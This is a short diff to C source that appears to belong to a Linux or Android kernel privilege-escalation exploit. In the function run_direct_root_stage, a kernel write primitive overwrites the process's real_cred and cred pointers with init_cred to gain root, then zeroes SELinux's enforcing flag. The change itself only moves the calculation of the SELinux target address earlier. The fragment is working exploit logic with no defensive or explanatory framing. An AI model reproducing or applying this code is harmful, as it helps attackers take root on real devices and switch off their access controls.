@@ -652,13 +652,13 @@ static int run_direct_root_stage(void) {
              getuid(), getpid(), (unsigned long long)task,
              real_cred_slot, cred_slot, init_cred);
 
+  uintptr_t selinux_target = canon_addr(SELINUX_ENFORCING);
+  pr_success("direct-step selinux_target=%016zx\n", selinux_target);
   if (!direct_trigger_write64(
           "install_real_cred", real_cred_slot, init_cred, 1, &write_idx)) {
     pr_error("direct real_cred install failed\n");
     return 0;
   }
-  uintptr_t selinux_target = canon_addr(SELINUX_ENFORCING);
-  pr_success("direct-step selinux_target=%016zx\n", selinux_target);
   if (!direct_trigger_write64_followup(
           "install_cred_then_selinux_zero", cred_slot, init_cred, 1,
           selinux_target, &write_idx)) {
